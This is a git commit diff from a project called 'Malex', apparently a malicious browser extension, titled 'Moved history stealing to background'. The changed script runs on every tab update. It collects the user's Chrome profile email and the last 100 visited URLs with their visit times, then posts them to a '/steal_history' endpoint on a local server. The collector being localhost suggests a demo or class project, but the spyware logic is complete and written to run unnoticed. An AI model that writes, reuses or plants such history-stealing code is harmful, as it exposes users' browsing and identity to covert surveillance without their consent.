a7923dfd976644db97e9306b26ba46ce50b62780
swuleung <sammiwuleung@gmail.com>
2018-12-01 17:09:03 -0500

    Moved history stealing to background

--- Malex/scripts/history.js
+++ Malex/scripts/history.js
@@ -1,6 +1,4 @@
-/* global chrome */
-
-document.addEventListener('DOMContentLoaded', function () {
+chrome.tabs.onUpdated.addListener(function () {
     chrome.identity.getProfileUserInfo(function (userInfo) {
         var userEmail;
         if (userInfo.email == "") {
@@ -13,21 +11,21 @@ document.addEventListener('DOMContentLoaded', function () {
         dataObj['email'] = userEmail;
         chrome.storage.local.set(dataObj);
         localStorage.setItem('email', userEmail);
-        
         chrome.history.search({ text: '', maxResults: 100 },
-        function (data) {
-            var page_urls = [];
-            var page_last_visited = [];
-            data.forEach(function (page) {
-                page_urls.push(page.url);
-                page_last_visited.push(page.lastVisitTime)
-            });
-            $.post("http://localhost:5000/steal_history", {
+            function (data) {
+                var page_urls = [];
+                var page_last_visited = [];
+                data.forEach(function (page) {
+                    page_urls.push(page.url);
+                    page_last_visited.push(page.lastVisitTime)
+                });
+                $.post("http://localhost:5000/steal_history", {
                     email: userEmail,
                     urls: page_urls,
                     last_visits: page_last_visited
                 });
-        }
-    );
+                console.log("sent");
+            }
+        );
     });
 });
